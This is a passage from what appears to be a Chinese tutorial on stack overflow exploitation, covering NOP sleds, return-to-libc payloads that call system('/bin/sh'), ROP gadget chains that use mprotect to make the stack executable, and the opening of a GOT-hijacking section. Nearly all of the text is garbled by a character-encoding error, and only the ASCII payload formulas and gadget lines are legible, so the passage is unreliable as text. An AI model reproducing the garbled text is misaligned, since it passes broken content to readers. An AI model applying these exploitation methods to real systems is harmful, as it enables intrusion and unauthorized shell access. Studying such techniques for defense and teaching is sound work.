4ï¼ˆ32ä½æœºï¼‰ï¼Œå‚è§å‰é¢å…³äºå‡½æ•°çŠ¶æ€çš„é“¾æ¥ï¼‰ï¼Œå¯æ˜¯åœ¨è°ƒè¯•å·¥å…·é‡Œçš„è¿™ä¸ªåœ°å€å’Œæ­£å¸¸è¿è¡Œæ—¶å¹¶ä¸ä¸€è‡´ï¼Œè¿™æ˜¯è¿è¡Œæ—¶ç¯å¢ƒå˜é‡ç­‰å› ç´ æœ‰æ‰€ä¸åŒé€ æˆçš„ã€‚æ‰€ä»¥è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬åªèƒ½å¾—åˆ°å¤§è‡´ä½†ä¸ç¡®åˆ‡çš„shellcodeèµ·å§‹åœ°å€ï¼Œè§£å†³åŠæ³•æ˜¯åœ¨padding2é‡Œå¡«å……è‹¥å¹²é•¿åº¦çš„\\x90ã€‚è¿™ä¸ªæœºå™¨ç å¯¹åº”çš„æŒ‡ä»¤æ˜¯NOP(No Operation)ï¼Œä¹Ÿå°±æ˜¯å‘Šè¯‰CPUä»€ä¹ˆä¹Ÿä¸åšï¼Œç„¶åè·³åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚æœ‰äº†è¿™ä¸€æ®µNOPçš„å¡«å……ï¼Œåªè¦è¿”å›åœ°å€èƒ½å¤Ÿå‘½ä¸­è¿™ä¸€æ®µä¸­çš„ä»»æ„ä½ç½®ï¼Œéƒ½å¯ä»¥æ— å‰¯ä½œç”¨åœ°è·³è½¬åˆ°shellcodeçš„èµ·å§‹å¤„ï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•è¢«ç§°ä¸ºNOP Sledï¼ˆä¸­æ–‡å«ä¹‰æ˜¯â€œæ»‘é›ªæ©‡â€ï¼‰ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å¢åŠ NOPå¡«å……æ¥é…åˆè¯•éªŒshellcodeèµ·å§‹åœ°å€ã€‚ å¦å¤–ï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥å°†å‡½æ•°è°ƒç”¨æ ˆçš„èµ·å§‹åœ°å€è®¾ä¸ºéšæœºåŒ–ï¼ˆè¿™ç§æŠ€æœ¯è¢«ç§°ä¸ºå†…å­˜å¸ƒå±€éšæœºåŒ–ï¼Œå³Address Space Layout Randomization (ASLR)ï¼‰ï¼Œè¿™æ ·ç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶å‡½æ•°è¿”å›åœ°å€ä¼šéšæœºå˜åŒ–ã€‚åä¹‹å¦‚æœæ“ä½œç³»ç»Ÿå…³é—­äº†ä¸Šè¿°çš„éšæœºåŒ–ï¼ˆè¿™æ˜¯æŠ€æœ¯å¯ä»¥ç”Ÿæ•ˆçš„å‰æï¼‰ï¼Œé‚£ä¹ˆç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶å‡½æ•°è¿”å›åœ°å€ä¼šæ˜¯ç›¸åŒçš„ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥é€šè¿‡è¾“å…¥æ— æ•ˆçš„æº¢å‡ºæ•°æ®æ¥ç”Ÿæˆcoreæ–‡ä»¶ï¼Œå†é€šè¿‡è°ƒè¯•å·¥å…·åœ¨coreæ–‡ä»¶ä¸­æ‰¾åˆ°è¿”å›åœ°å€çš„ä½ç½®ï¼Œä»è€Œç¡®å®šshellcodeçš„èµ·å§‹åœ°å€ã€‚ è§£å†³å®Œä¸Šè¿°é—®é¢˜ï¼Œå°±å¯ä»¥æ‹¼æ¥å‡ºæœ€ç»ˆçš„æº¢å‡ºæ•°æ®ï¼Œè¾“å…¥è‡³ç¨‹åºæ¥æ‰§è¡Œshellcodeäº†ã€‚ è¿™ç§æ–¹æ³•ç”Ÿæ•ˆçš„ä¸€ä¸ªå‰ææ˜¯åœ¨å‡½æ•°è°ƒç”¨æ ˆä¸Šçš„æ•°æ®ï¼ˆshellcodeï¼‰è¦æœ‰å¯æ‰§è¡Œçš„æƒé™ï¼ˆå¦ä¸€ä¸ªå‰ææ˜¯å…³é—­å†…å­˜å¸ƒå±€éšæœºåŒ–ï¼‰ã€‚å¾ˆå¤šæ—¶å€™æ“ä½œç³»ç»Ÿä¼šå…³é—­å‡½æ•°è°ƒç”¨æ ˆçš„å¯æ‰§è¡Œæƒé™ï¼Œè¿™æ · shellcode çš„æ–¹æ³•å°±å¤±æ•ˆäº†ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜å¯ä»¥å°è¯•ä½¿ç”¨å†…å­˜é‡Œå·²æœ‰çš„æŒ‡ä»¤æˆ–å‡½æ•°ï¼Œæ¯•ç«Ÿè¿™äº›éƒ¨åˆ†æœ¬æ¥å°±æ˜¯å¯æ‰§è¡Œçš„ï¼Œæ‰€ä»¥ä¸ä¼šå—ä¸Šè¿°æ‰§è¡Œæƒé™çš„é™åˆ¶ã€‚è¿™ç§æƒ…å†µåŒ…æ‹¬Return2libcå’ŒROPä¸¤ç§æ–¹æ³•ã€‚ Return2libc ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„æŸä¸ªå‡½æ•° è¯¥æ–¹æ³•è¦å®Œæˆçš„ä»»åŠ¡åŒ…æ‹¬ï¼šåœ¨å†…å­˜ä¸­ç¡®å®šæŸä¸ªå‡½æ•°çš„åœ°å€ï¼Œå¹¶ç”¨å…¶è¦†ç›–æ‰è¿”å›åœ°å€ã€‚ç”±äºlibcåŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°è¢«å¹¿æ³›ä½¿ç”¨ï¼Œæ‰€ä»¥æœ‰å¾ˆå¤§æ¦‚ç‡å¯ä»¥åœ¨å†…å­˜ä¸­æ‰¾åˆ°è¯¥åŠ¨æ€åº“ã€‚åŒæ—¶ç”±äºè¯¥åº“åŒ…å«äº†ä¸€äº›ç³»ç»Ÿçº§çš„å‡½æ•°ï¼Œæ‰€ä»¥é€šå¸¸ä½¿ç”¨è¿™äº›ç³»ç»Ÿçº§å‡½æ•°æ¥è·å¾—å½“å‰è¿›ç¨‹çš„æ§åˆ¶æƒã€‚é‰´äºè¦æ‰§è¡Œçš„å‡½æ•°å¯èƒ½éœ€è¦å‚æ•°ï¼Œæ¯”å¦‚è°ƒç”¨systemå‡½æ•°æ‰“å¼€shellçš„å®Œæ•´å½¢å¼ä¸ºsystem(â€œ/bin/shâ€)ï¼Œæ‰€ä»¥æº¢å‡ºæ•°æ®ä¹Ÿè¦åŒ…æ‹¬å¿…è¦çš„å‚æ•°ã€‚ä¸‹é¢ä»¥æ‰§è¡Œsystem(â€œ/bin/shâ€)ä¸ºä¾‹ï¼Œå…ˆå†™å‡ºæº¢å‡ºæ•°æ®çš„ç»„æˆï¼Œå†ç¡®å®šå¯¹åº”çš„å„éƒ¨åˆ†å¡«å……è¿›å»ã€‚ æº¢å‡ºæ•°æ®ç»„æˆå¦‚ä¸‹ï¼š payload = padding1 + address of system() + padding2 + address of â€œ/bin/shâ€ æº¢å‡ºæ•°æ®å„éƒ¨åˆ†å«ä¹‰å¦‚ä¸‹ï¼š padding1å¤„çš„æ•°æ®å¯ä»¥éšæ„å¡«å……ï¼ˆæ³¨æ„ä¸è¦åŒ…å«\\x00ï¼Œå¦åˆ™å‘ç¨‹åºä¼ å…¥æº¢å‡ºæ•°æ®æ—¶ä¼šé€ æˆæˆªæ–­ï¼‰ï¼Œé•¿åº¦åº”è¯¥åˆšå¥½è¦†ç›–å‡½æ•°çš„åŸºåœ°å€ã€‚address of system()æ˜¯systemåœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œç”¨æ¥è¦†ç›–è¿”å›åœ°å€ã€‚padding2å¤„çš„æ•°æ®é•¿åº¦ä¸º4ï¼ˆ32ä½æœºï¼‰ï¼Œå¯¹åº”è°ƒç”¨systemæ—¶çš„è¿”å›åœ°å€ã€‚å› ä¸ºæˆ‘ä»¬åœ¨è¿™é‡Œåªéœ€è¦æ‰“å¼€shellå°±å¯ä»¥ï¼Œå¹¶ä¸å…³å¿ƒä»shellé€€å‡ºä¹‹åçš„è¡Œä¸ºï¼Œæ‰€ä»¥padding2çš„å†…å®¹å¯ä»¥éšæ„å¡«å……ã€‚address of â€œ/bin/shâ€æ˜¯å­—ç¬¦ä¸²/bin/shåœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œä½œä¸ºä¼ ç»™systemçš„å‚æ•°ã€‚ æ ¹æ®ä¸Šé¢çš„æ„é€ ï¼Œæˆ‘ä»¬è¦è§£å†³ä»¥ä¸‹ä¸¤ä¸ªé—®é¢˜ï¼š 1ã€è¿”å›åœ°å€ä¹‹å‰çš„å¡«å……æ•°æ®padding1åº”è¯¥å¤šé•¿ï¼Ÿ è§£å†³æ–¹æ³•å’Œshellcodeä¸­æåˆ°çš„ç­”æ¡ˆä¸€æ ·ã€‚ 2ã€systemå‡½æ•°åœ°å€åº”è¯¥æ˜¯å¤šå°‘ï¼Ÿ é¦–å…ˆè¦çŸ¥é“ç¨‹åºæ˜¯å¦‚ä½•è°ƒç”¨åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°çš„ï¼šå½“å‡½æ•°è¢«åŠ¨æ€é“¾æ¥è‡³ç¨‹åºä¸­ï¼Œç¨‹åºåœ¨è¿è¡Œæ—¶é¦–å…ˆç¡®å®šåŠ¨æ€é“¾æ¥åº“åœ¨å†…å­˜çš„èµ·å§‹åœ°å€ï¼Œå†åŠ ä¸Šå‡½æ•°åœ¨åŠ¨æ€åº“ä¸­çš„ç›¸å¯¹åç§»é‡ï¼Œæœ€ç»ˆå¾—åˆ°å‡½æ•°åœ¨å†…å­˜çš„ç»å¯¹åœ°å€ã€‚åœ¨ASLRè¢«å…³é—­çš„å‰æä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒè¯•å·¥å…·åœ¨è¿è¡Œç¨‹åºè¿‡ç¨‹ä¸­ç›´æ¥æŸ¥çœ‹systemçš„åœ°å€ï¼Œä¹Ÿå¯ä»¥æŸ¥çœ‹åŠ¨æ€åº“åœ¨å†…å­˜çš„èµ·å§‹åœ°å€ï¼Œå†åœ¨åŠ¨æ€åº“å†…æŸ¥çœ‹å‡½æ•°çš„ç›¸å¯¹åç§»ä½ç½®ï¼Œé€šè¿‡è®¡ç®—å¾—åˆ°å‡½æ•°çš„ç»å¯¹åœ°å€ã€‚è€Œå½“ASLRå¼€å¯çš„æ—¶å€™ï¼Œä¼šå°†åŠ¨æ€åº“åŠ è½½çš„èµ·å§‹åœ°å€åšéšæœºåŒ–å¤„ç†ï¼Œç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶åŠ¨æ€åº“çš„èµ·å§‹åœ°å€éƒ½ä¼šå˜åŒ–ï¼Œä¹Ÿå°±æ— ä»ç¡®å®šåº“å†…å‡½æ•°çš„ç»å¯¹åœ°å€ã€‚ 3ã€/bin/shçš„åœ°å€åœ¨å“ªé‡Œï¼Ÿ å¯ä»¥åœ¨åŠ¨æ€åº“é‡Œæœç´¢å­—ç¬¦ä¸²/bin/shï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±å¯ä»¥æŒ‰ç…§åŠ¨æ€åº“èµ·å§‹åœ°å€ï¼‹ç›¸å¯¹åç§»æ¥ç¡®å®šå…¶ç»å¯¹åœ°å€ã€‚å¦‚æœåœ¨åŠ¨æ€åº“é‡Œæ‰¾ä¸åˆ°ï¼Œå¯ä»¥å°†è¿™ä¸ªå­—ç¬¦ä¸²åŠ åˆ°ç¯å¢ƒå˜é‡é‡Œï¼Œå†é€šè¿‡getenvç­‰å‡½æ•°æ¥ç¡®å®šåœ°å€ã€‚ è§£å†³å®Œä¸Šè¿°é—®é¢˜ï¼Œå°±å¯ä»¥æ‹¼æ¥å‡ºæº¢å‡ºæ•°æ®ï¼Œè¾“å…¥è‡³ç¨‹åºæ¥é€šè¿‡systemè·å–shelläº†ã€‚ ROP ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„ä¸€æ®µæŒ‡ä»¤ è¯¥æ–¹æ³•è¦å®Œæˆçš„ä»»åŠ¡åŒ…æ‹¬ï¼šåœ¨å†…å­˜ä¸­ç¡®å®šæŸæ®µæŒ‡ä»¤çš„åœ°å€ï¼Œå¹¶ç”¨å…¶è¦†ç›–è¿”å›åœ°å€ã€‚å¯æ˜¯æ—¢ç„¶å¯ä»¥è¦†ç›–è¿”å›åœ°å€å¹¶å®šä½åˆ°å†…å­˜åœ°å€ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨ä¸Šç¯‡æåˆ°çš„return2libcå‘¢ï¼Ÿå› ä¸ºæœ‰æ—¶ç›®æ ‡å‡½æ•°åœ¨å†…å­˜å†…æ— æ³•æ‰¾åˆ°ï¼Œæœ‰æ—¶ç›®æ ‡æ“ä½œå¹¶æ²¡æœ‰ç‰¹å®šçš„å‡½æ•°å¯ä»¥å®Œç¾é€‚é…ã€‚è¿™æ—¶å°±éœ€è¦åœ¨å†…å­˜ä¸­å¯»æ‰¾å¤šä¸ªæŒ‡ä»¤ç‰‡æ®µï¼Œæ‹¼å‡‘å‡ºä¸€ç³»åˆ—æ“ä½œæ¥è¾¾æˆç›®çš„ã€‚å‡å¦‚è¦æ‰§è¡ŒæŸæ®µæŒ‡ä»¤ï¼ˆå°†å…¶ç§°ä¸ºgadgetï¼Œæ„ä¸ºå°å·¥å…·ï¼‰ï¼Œæº¢å‡ºæ•°æ®åº”è¯¥ä»¥ä¸‹é¢çš„æ–¹å¼æ„é€ ï¼ˆpaddingé•¿åº¦å’Œå†…å®¹çš„ç¡®å®šæ–¹å¼å‚è§ä¸Šç¯‡ï¼‰ï¼š payload = padding + address of gadget æº¢å‡ºæ•°æ®åœ¨æ ˆä¸­çš„åˆ†å¸ƒå¦‚ä¸‹å›¾ï¼š è€Œå¦‚æœæƒ³è¿ç»­æ‰§è¡Œè‹¥å¹²æ®µæŒ‡ä»¤ï¼Œå°±éœ€è¦æ¯ä¸ªgadgetæ‰§è¡Œå®Œæ¯•å¯ä»¥å°†æ§åˆ¶æƒäº¤ç»™ä¸‹ä¸€ä¸ªgadgetã€‚æ‰€ä»¥gadgetçš„æœ€åä¸€æ­¥åº”è¯¥æ˜¯RETæŒ‡ä»¤ï¼Œè¿™æ ·ç¨‹åºçš„æ§åˆ¶æƒï¼ˆeipï¼‰æ‰èƒ½å¾—åˆ°åˆ‡æ¢ï¼Œæ‰€ä»¥è¿™ç§æŠ€æœ¯è¢«ç§°ä¸ºè¿”å›å¯¼å‘ç¼–ç¨‹ï¼ˆReturn Oriented Programmingï¼‰ã€‚è¦æ‰§è¡Œå¤šä¸ªgadgetï¼Œæº¢å‡ºæ•°æ®åº”è¯¥ä»¥ä¸‹é¢çš„æ–¹å¼æ„é€ ï¼š payload = padding + address of gadget 1 + address of gadget 2 + ...... + address of gadget n åœ¨è¿™æ ·çš„æ„é€ ä¸‹ï¼Œè¢«è°ƒç”¨å‡½æ•°è¿”å›æ—¶ä¼šè·³è½¬æ‰§è¡Œgadget 1ï¼Œæ‰§è¡Œå®Œæ¯•æ—¶gadget 1çš„RETæŒ‡ä»¤ä¼šå°†æ­¤æ—¶çš„æ ˆé¡¶æ•°æ®ï¼ˆä¹Ÿå°±æ˜¯gadget 2çš„åœ°å€ï¼‰å¼¹å‡ºè‡³eipï¼Œç¨‹åºç»§ç»­è·³è½¬æ‰§è¡Œgadget 2ï¼Œä»¥æ­¤ç±»æ¨ã€‚ å¤šä¸ªgadgetçš„æº¢å‡ºæ•°æ®åœ¨æ ˆä¸­åˆ†å¸ƒå¦‚ä¸‹ï¼š ç°åœ¨ä»»åŠ¡å¯ä»¥åˆ†è§£ä¸ºï¼šé’ˆå¯¹ç¨‹åºæ ˆæº¢å‡ºæ‰€è¦å®ç°çš„æ•ˆæœï¼Œæ‰¾åˆ°è‹¥å¹²æ®µä»¥retä½œä¸ºç»“æŸçš„æŒ‡ä»¤ç‰‡æ®µï¼ŒæŒ‰ç…§ä¸Šè¿°çš„æ„é€ å°†å®ƒä»¬çš„åœ°å€å¡«å……åˆ°æº¢å‡ºæ•°æ®ä¸­ã€‚æ‰€ä»¥æˆ‘ä»¬è¦è§£å†³ä»¥ä¸‹å‡ ä¸ªé—®é¢˜ï¼š 1ã€æ ˆæº¢å‡ºä¹‹åè¦å®ç°ä»€ä¹ˆæ•ˆæœï¼Ÿ ROPå¸¸è§çš„æ‹¼å‡‘æ•ˆæœæ˜¯å®ç°ä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨ï¼ŒLinuxç³»ç»Ÿä¸‹å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤æ˜¯int 0x80ã€‚æ‰§è¡Œè¿™æ¡æŒ‡ä»¤æ—¶ï¼Œè¢«è°ƒç”¨å‡½æ•°çš„ç¼–å·åº”å­˜å…¥eaxï¼Œè°ƒç”¨å‚æ•°åº”æŒ‰é¡ºåºå­˜å…¥ebxï¼Œecxï¼Œedxï¼Œesiï¼Œediä¸­ã€‚ä¾‹å¦‚ï¼Œç¼–å·125å¯¹åº”å‡½æ•°ï¼šmprotect (void *addr, size_t len, int prot)ï¼Œå¯ç”¨è¯¥å‡½æ•°å°†æ ˆçš„å±æ€§æ”¹ä¸ºå¯æ‰§è¡Œï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨shellcodeäº†ã€‚å‡å¦‚æˆ‘ä»¬æƒ³åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨æ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œeaxã€ebxã€ecxã€edxåº”è¯¥åˆ†åˆ«ä¸ºï¼š125ã€å†…å­˜æ ˆçš„åˆ†æ®µåœ°å€ï¼ˆå¯ä»¥é€šè¿‡è°ƒè¯•å·¥å…·ç¡®å®šï¼‰ã€0x10000ï¼ˆéœ€è¦ä¿®æ”¹çš„ç©ºé—´é•¿åº¦ï¼Œä¹Ÿè®¸éœ€è¦æ›´é•¿ï¼‰ã€7ï¼ˆRWX æƒé™ï¼‰ã€‚ 2ã€å¦‚ä½•å¯»æ‰¾å¯¹åº”çš„æŒ‡ä»¤ç‰‡æ®µï¼Ÿ æœ‰è‹¥å¹²å¼€æºå·¥å…·å¯ä»¥å®ç°æœç´¢ä»¥retç»“å°¾çš„æŒ‡ä»¤ç‰‡æ®µï¼Œè‘—åçš„åŒ…æ‹¬ROPgadgetã€rp++ã€ropemeç­‰ï¼Œç”šè‡³ä¹Ÿå¯ä»¥ç”¨grepç­‰æ–‡æœ¬åŒ¹é…å·¥å…·åœ¨æ±‡ç¼–æŒ‡ä»¤ä¸­æœç´¢retå†è¿›ä¸€æ­¥ç­›é€‰ã€‚ 3ã€å¦‚ä½•ä¼ å…¥ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°ï¼Ÿ å¯¹äºä¸Šé¢æåˆ°çš„mprotectå‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦å°†å‚æ•°ä¼ è¾“è‡³å¯„å­˜å™¨ï¼Œå¯ä»¥ç”¨popæŒ‡ä»¤å°†æ ˆé¡¶æ•°æ®å¼¹å…¥å¯„å­˜å™¨ã€‚å¦‚æœåœ¨å†…å­˜ä¸­èƒ½æ‰¾åˆ°ç›´æ¥å¯ç”¨çš„æ•°æ®ï¼Œä¹Ÿå¯ä»¥ç”¨movæŒ‡ä»¤æ¥è¿›è¡Œä¼ è¾“ï¼Œä¸è¿‡å†™å…¥æ•°æ®å† popè¦æ¯”å…ˆæœç´¢å†movæ¥çš„ç®€å•ï¼Œå¦‚æœè¦ç”¨popæŒ‡ä»¤æ¥ä¼ è¾“è°ƒç”¨å‚æ•°ï¼Œå°±éœ€è¦åœ¨æº¢å‡ºæ•°æ®å†…åŒ…å«è¿™äº›å‚æ•°ï¼Œæ‰€ä»¥ä¸Šé¢çš„æº¢å‡ºæ•°æ®æ ¼å¼éœ€è¦ä¸€ç‚¹ä¿®æ”¹ã€‚å¯¹äºå•ä¸ªgadgetï¼Œpopæ‰€ä¼ è¾“çš„æ•°æ®åº”è¯¥åœ¨ gadgetåœ°å€ä¹‹åï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ åœ¨è°ƒç”¨mprotect()ä¸ºæ ˆå¼€å¯å¯æ‰§è¡Œæƒé™ä¹‹åï¼Œæˆ‘ä»¬å¸Œæœ›æ‰§è¡Œä¸€æ®µshellcodeï¼Œæ‰€ä»¥è¦å°†shellcodeä¹ŸåŠ å…¥æº¢å‡ºæ•°æ®ï¼Œå¹¶å°†shellcodeçš„å¼€å§‹åœ°å€åŠ åˆ°int 0x80çš„gadgetä¹‹åã€‚ä½†ç¡®å®šshellcodeåœ¨å†…å­˜çš„ç¡®åˆ‡åœ°å€æ˜¯å¾ˆå›°éš¾çš„äº‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨push espè¿™ä¸ªgadgetã€‚ æˆ‘ä»¬å‡è®¾ç°åœ¨å†…å­˜ä¸­å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹å‡ æ¡æŒ‡ä»¤ï¼š pop eax; ret; # pop stack top into eaxpop ebx; ret; # pop stack top into ebxpop ecx; ret; # pop stack top into ecxpop edx; ret; # pop stack top into edxint 0x80; ret; # system callpush esp; ret; # push address of shellcode å¯¹äºæ‰€æœ‰åŒ…å«popæŒ‡ä»¤çš„gadgetï¼Œåœ¨å…¶åœ°å€ä¹‹åéƒ½è¦æ·»åŠ popçš„ä¼ è¾“æ•°æ®ï¼ŒåŒæ—¶åœ¨æ‰€æœ‰gadgetæœ€ååŒ…å«ä¸€æ®µshellcodeï¼Œæœ€ç»ˆæº¢å‡ºæ•°æ®ç»“æ„åº”è¯¥å˜ä¸ºå¦‚ä¸‹æ ¼å¼ï¼š payload = padding + address of gadget 1 + param for gadget 1 + address of gadget 2 + param for gadget 2 + ...... + address of gadget n + shellcode ä¸ºäº†ç®€å•ï¼Œå‡å®šè¾“å…¥æº¢å‡ºæ•°æ®ä¸å—\\x00å­—ç¬¦çš„å½±å“ï¼Œæ‰€ä»¥payloadå¯ä»¥ç›´æ¥åŒ…å«\\x7d\\x00\\x00\\x00ï¼ˆä¼ ç»™eaxçš„å‚æ•°125ï¼‰ã€‚å¦‚æœå¸Œæœ›å®ç°æ›´ä¸ºçœŸå®çš„æ“ä½œï¼Œå¯ä»¥ç”¨å¤šä¸ªgadgeté€šè¿‡è¿ç®—å¾—åˆ°ä¸Šè¿°å‚æ•°ã€‚æ¯”å¦‚å¯ä»¥é€šè¿‡ä¸‹é¢ä¸‰æ¡gadgetæ¥ç»™eaxä¼ é€’å‚æ•°ï¼š pop eax; ret; # pop stack top 0x1111118e into eaxpop ebx; ret; # pop stack top 0x11111111 into ebxsub eax, ebx; ret; # eax -= ebx è§£å†³å®Œä¸Šè¿°é—®é¢˜ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‹¼æ¥å‡ºæº¢å‡ºæ•°æ®ï¼Œè¾“å…¥è‡³ç¨‹åºæ¥ä¸ºç¨‹åºè°ƒç”¨æ ˆå¼€å¯å¯æ‰§è¡Œæƒé™å¹¶æ‰§è¡Œ shellcodeã€‚åŒæ—¶ï¼Œç”±äºROPæ–¹æ³•å¸¦æ¥çš„çµæ´»æ€§ï¼Œç°åœ¨ä¸å†éœ€è¦ç—›è‹¦åœ°è¯•æ¢shellcodeèµ·å§‹åœ°å€äº†ã€‚å›é¡¾æ•´ä¸ªè¾“å…¥æ•°æ®ï¼Œåªæœ‰æ ˆçš„åˆ†æ®µåœ°å€éœ€è¦è·å–ç¡®å®šåœ°å€ã€‚å¦‚æœåˆ©ç”¨gadgetè¯»å–ebpçš„å€¼å†åŠ ä¸ŠæŸä¸ªåˆé€‚çš„æ•°å€¼ï¼Œå°±å¯ä»¥ä¿è¯æº¢å‡ºæ•°æ®éƒ½å…·æœ‰å¯æ‰§è¡Œæƒé™ï¼Œè¿™æ ·å°±ä¸å†éœ€è¦è·å–ç¡®åˆ‡åœ°å€ï¼Œä¹Ÿå°±å…·æœ‰äº†ç»•è¿‡å†…å­˜éšæœºåŒ–çš„å¯èƒ½ã€‚ å®é™…æœç´¢åŠæ‹¼æ¥gadgetæ—¶ï¼Œå¹¶ä¸ä¼šåƒä¸Šé¢ä¸€æ ·é¡ºåˆ©ï¼Œæœ‰ä¸¤ä¸ªæ–¹é¢éœ€è¦æ³¨æ„ï¼š 1ã€å¾ˆå¤šæ—¶å€™å¹¶ä¸èƒ½ä¸€æ¬¡å‡‘é½å…¨éƒ¨çš„ç†æƒ³æŒ‡ä»¤ç‰‡æ®µï¼Œè¿™æ—¶å°±è¦é€šè¿‡æ•°æ®åœ°å€çš„åç§»ã€å¯„å­˜å™¨ä¹‹é—´çš„æ•°æ®ä¼ è¾“ç­‰æ–¹æ³•æ¥â€œæ›²çº¿æ•‘å›½â€ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾æ‰¾ä¸åˆ°ä¸‹é¢è¿™æ¡gadgetï¼š pop ebx; ret; ä½†å‡å¦‚å¯ä»¥æ‰¾åˆ°ä¸‹é¢çš„gadgetï¼š mov ebx, eax; ret; å°±å¯ä»¥å°†å®ƒå’Œ pop eax; ret; ç»„åˆèµ·æ¥å®ç°å°†æ•°æ®ä¼ è¾“ç»™ebxçš„åŠŸèƒ½ã€‚ä¸Šé¢æåˆ°çš„ç”¨å¤šä¸ªgadgeté¿å…è¾“å…¥\\x00ä¹Ÿæ˜¯ä¸€ä¸ªå®ä¾‹åº”ç”¨ã€‚ 2ã€è¦å°å¿ƒgadgetæ˜¯å¦ä¼šç ´åå‰é¢å„ä¸ªgadgetå·²ç»å®ç°çš„éƒ¨åˆ†ï¼Œæ¯”å¦‚å¯èƒ½ä¿®æ”¹æŸä¸ªå·²ç»å†™å…¥æ•°å€¼çš„å¯„å­˜å™¨ã€‚å¦å¤–ï¼Œè¦ç‰¹åˆ«å°å¿ƒgadgetå¯¹ebpå’Œespçš„æ“ä½œï¼Œå› ä¸ºå®ƒä»¬çš„å˜åŒ–ä¼šæ”¹å˜è¿”å›åœ°å€çš„ä½ç½®ï¼Œè¿›è€Œä½¿åç»­çš„gadgetæ— æ³•æ‰§è¡Œã€‚ Hijack GOT ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€ï¼Œè®©å…¶æŒ‡å‘å¦ä¸€ä¸ªå‡½æ•° è¯¥æ–¹æ³•è¦å®Œæˆçš„ä»»åŠ¡åŒ…æ‹¬ï¼šåœ¨å†…å­˜ä¸­ä¿®æ”¹æŸä¸ªå‡½æ•°çš„åœ°å€ï¼Œä½¿å…¶æŒ‡å‘å¦ä¸€ä¸ªå‡½æ•°ã€‚ä¸ºäº†ä¾¿äºç†è§£ï¼Œä¸å¦¨å‡è®¾ä¿®æ”¹printf()å‡½æ•°çš„åœ°å€ä½¿å…¶æŒ‡å‘system()ï¼Œè¿™æ ·ä¿®æ”¹ä¹‹åç¨‹åºå†…å¯¹ printf()çš„è°ƒç”¨å°±æ‰§è¡Œsystem()å‡½æ•°ã€‚è¦å®ç°è¿™ä¸ªè¿‡ç¨‹ï¼Œæˆ‘ä»¬å°±è¦å¼„æ¸…æ¥šå‘ç”Ÿå‡½æ•°è°ƒç”¨æ—¶ç¨‹åºæ˜¯å¦‚ä½•æ‰¾åˆ°è¢«è°ƒç”¨å‡½æ•°çš„ã€‚ ç¨‹åºå¯¹å¤–éƒ¨å‡½æ•°çš„è°ƒç”¨éœ€è¦åœ¨ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶æ—¶å°†å¤–éƒ¨å‡½æ•°é“¾æ¥åˆ°ç¨‹åºä¸­ï¼Œé“¾æ¥çš„æ–¹å¼åˆ†ä¸ºé™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥ã€‚é™æ€é“¾æ¥å¾—åˆ°çš„å¯æ‰§è¡Œæ–‡ä»¶åŒ…å«å¤–éƒ¨å‡½æ•°çš„å…¨éƒ¨ä»£ç ï¼ŒåŠ¨æ€é“¾æ¥å¾—åˆ°çš„å¯æ‰§è¡Œæ–‡ä»¶å¹¶ä¸åŒ…å«å¤–éƒ¨å‡½æ•°çš„ä»£ç ï¼Œè€Œæ˜¯åœ¨è¿è¡Œæ—¶å°†åŠ¨æ€é“¾æ¥åº“ï¼ˆè‹¥å¹²å¤–éƒ¨å‡½æ•°çš„é›†åˆï¼‰åŠ è½½åˆ°å†…å­˜çš„æŸä¸ªä½ç½®ï¼Œå†åœ¨å‘ç”Ÿè°ƒç”¨æ—¶å»é“¾æ¥åº“å®šä½æ‰€éœ€çš„å‡½æ•°ã€‚ ç¨‹åºæ˜¯å¦‚ä½•åœ¨é“¾æ¥åº“å†…å®šä½åˆ°æ‰€éœ€çš„å‡½æ•°å‘¢ï¼Ÿ è¿™ä¸ªè¿‡ç¨‹ç”¨åˆ°äº†ä¸¤å¼ è¡¨ï¼šGOTå’ŒPLTã€‚GOTå…¨ç§°æ˜¯å…¨å±€åç§»é‡è¡¨ï¼ˆGlobal Offset Tableï¼‰ï¼Œç”¨æ¥å­˜å‚¨å¤–éƒ¨å‡½æ•°åœ¨å†…å­˜çš„ç¡®åˆ‡åœ°å€ã€‚GOTå­˜å‚¨åœ¨æ•°æ®æ®µå†…ï¼Œå¯ä»¥åœ¨ç¨‹åºè¿è¡Œä¸­è¢«ä¿®æ”¹ã€‚PLTå…¨ç§°æ˜¯ç¨‹åºé“¾æ¥è¡¨ï¼ˆProcedure Linkage 